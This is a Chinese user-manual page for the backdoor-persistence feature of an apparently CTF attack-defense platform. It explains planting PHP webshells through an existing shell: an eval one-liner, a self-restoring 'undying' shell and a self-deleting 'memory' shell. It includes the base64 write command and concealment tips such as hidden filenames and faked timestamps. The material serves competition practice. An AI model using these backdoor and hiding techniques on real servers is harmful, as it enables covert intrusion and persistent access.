# 05 权限维持

**入口**：左侧菜单「攻击」→「权限维持」→ `/attack/persistence`
**接口**：`GET /api/v1/persistence`、`POST /api/v1/persistence`、`POST /api/v1/persistence/:id/check`、`DELETE /api/v1/persistence/:id`

> 说明：v0.2 后端**没有** `/persistence/upload` 和 `/persistence/:id/cleanup` 路由（前端代码里虽有调用，但会落到 SPA 首页返回 HTML）。实际投放是通过「基点 Shell 执行命令」完成的，记录用 `POST /persistence` 保存。

AWD 里「马被删」是最常见失分点。本页用你已有的 WebShell 作为**基点**，在目标上写入一个会自我恢复的后门，并自动登记成新的 Shell 资产。

---

## 1. 三种维持方式

| 类型 | 页面说明 | 原理 | 特点 |
|---|---|---|---|
| **一句话** | 简单可靠，直接写入文件 | 生成 `<?php if($_POST["pass"]==...) eval($_POST["cmd"]);?>` | 无恢复能力，但最隐蔽 |
| **不死马** | 持续写入，删除后自动恢复 | `ignore_user_abort(true)` + 死循环 + `file_put_contents` 每 5ms 重写 | 删了会回来；CPU 占用略高 |
| **内存马** | 驻留内存，无文件落地 | 启动器 `unlink(__FILE__)` 后常驻进程，持续写目标文件 | 启动器自删，较难发现 |

> 三种都只支持 **PHP**。生成逻辑由平台内置，密码可自动随机生成。

---

## 2. 前置条件

- 「基点 Shell」必须是**在线的 WebShell**（SSH 不在本页下拉里）；
- 基点 Shell 所在目录**可写**（`file_put_contents` 成功）；
- 目标未禁用 `file_put_contents` / `ignore_user_abort` / `set_time_limit`；
- 建议先手动在终端执行 `pwd`、`ls -ld .` 确认路径和权限。

---

## 3. 操作步骤

1. 打开「权限维持」页；
2. 顶部表单依次选择/填写：

| 字段 | 说明 | 默认 |
|---|---|---|
| 基点 Shell | 选择在线的 WebShell | — |
| 类型 | 一句话 / 不死马 / 内存马 | 一句话 |
| 文件名 | 落地文件名，建议点号开头隐藏 | 占位提示：`.shell.php` / `.immortal.php` / `.mem.php`（实际留空时：一句话与不死马用 `.shell.php`，内存马用 `.mem.php`） |
| 密码 | 新马连接密码，可点「生成」随机 | 留空时后端用 `default` |

3. 可点 **预览代码** 查看将要写入的内容；
4. 点 **上传 不死马/内存马/一句话**；
5. 弹窗显示实时进度：

```
生成木马代码完成
写入文件到: .immortal_launcher.php
文件写入成功 (WRITE_OK)
触发不死马启动...
等待不死马生成文件: .immortal.php...
验证目标文件: .immortal.php
通过基点 Shell 验证文件...
文件验证成功！
权限维持记录已保存
上传完成！
```

6. 成功后弹窗提供「查看结果」：显示新 Shell 的 **URL、路径、密码**，并在「Shell 管理」里自动新增一条 WebShell 资产（可直接使用）。

### 背后的动作

1. 把代码 **base64** 后，通过基点 Shell 执行：
   `file_put_contents('./<文件名>', base64_decode('<...>')); echo 'WRITE_OK'`
   - 一句话：写入的就是木马本体；
   - 不死马/内存马：先写入**启动器**（`.immortal_launcher.php` / `.memory_launcher.php`），启动器运行后再持续生成目标文件；
2. 用浏览器 `fetch(<启动器 URL>, {mode:'no-cors'})` 触发执行（1 秒超时，失败不阻塞）；
3. 等待 1 秒，用基点 Shell 执行 `print(file_exists('./<文件名>')?'EXISTS':'NOT_FOUND')` 验证；
4. 验证通过后 `POST /api/v1/persistence`，body：
   `{shell_id, type, url, path, password}`
   （`url` = 新马完整访问地址，`path` = 目标上的完整文件路径）；
5. 验证通过后，新马会自动出现在「Shell 管理」的 WebShell 列表里。

---

## 4. 权限维持记录

列表字段：基点 Shell、类型、访问地址（可复制）、密码（可复制）、状态、创建时间、操作。

| 状态 | 含义 |
|---|---|
| 存活（绿） | 最近一次检查能访问/文件存在 |
| 失效（红） | 文件被删或无法连接 |
| 未知（灰） | 尚未检查 |

操作（图标）：

- **检查状态**：`POST /persistence/:id/check` 重新验证存活；
- **打开终端**：用记录的 URL + 密码直接开终端，无需先回 Shell 管理；
- **删除**：仅删除平台里的记录（**不动目标文件**）；
- **批量删除**：清理多条记录（同样只删记录）。

> 页面没有「清理目标文件」按钮。收尾时要删马，请用 Shell 终端手动 `rm`，并先杀掉不死马进程。

---

## 5. 使用建议

| 场景 | 建议 |
|---|---|
| 刚拿到 Shell，怕被对手删 | 立刻投放**不死马**，密码随机，文件名点号开头 |
| 对手会全盘查杀 | 用**内存马**，启动器自删，只留目标文件 |
| 只想多一个备用马 | 一句话即可，放在不显眼目录 |
| 比赛结束 | 用 Shell 终端手动删除自己投放的后门（先杀进程再删文件），避免遗留 |

**隐藏技巧：**

- 文件名用 `.shell.php`、`.index.php`、`wp-cache.php` 之类；
- 放到 `uploads/`、`cache/`、`tmp/` 等有写权限且不常被看的目录；
- 修改文件时间戳：`touch -r index.php .shell.php`；
- 不要在同一目录放多个马，容易被批量发现。

---

## 6. 常见问题

**Q：上传失败，提示「文件写入失败，可能没有写入权限」？**
A：当前目录不可写。用基点 Shell 执行 `pwd; ls -ld .`，换 `/tmp`、`uploads/`、`runtime/` 等可写目录（注意 Web 可访问性）。

**Q：不死马/内存马上传成功，但验证文件不存在？**
A：① 启动器没被成功访问（目标禁止外部访问、路径不对）；② `ignore_user_abort`/`set_time_limit` 被禁用；③ PHP-FPM 超时杀进程。可改用「一句话」，或手动访问启动器 URL 再检查。

**Q：马很快又被删了？**
A：对手可能部署了实时文件监控。换文件名/目录，或用内存马；同时用「基线管理 → 文件监控」盯住自己的文件。

**Q：删了记录，目标上的文件还在？**
A：删除记录只删数据库，不动文件。不死马进程仍在运行会不断重建文件，先 `ps aux | grep php` 杀掉进程（或重启 PHP-FPM）再 `rm` 文件。

**Q：为什么下拉里没有 SSH？**
A：本功能只针对 WebShell 落地文件；SSH 维持请用「基线管理」的 SSH 密码/权限相关操作，或手动写 cron/authorized_keys。
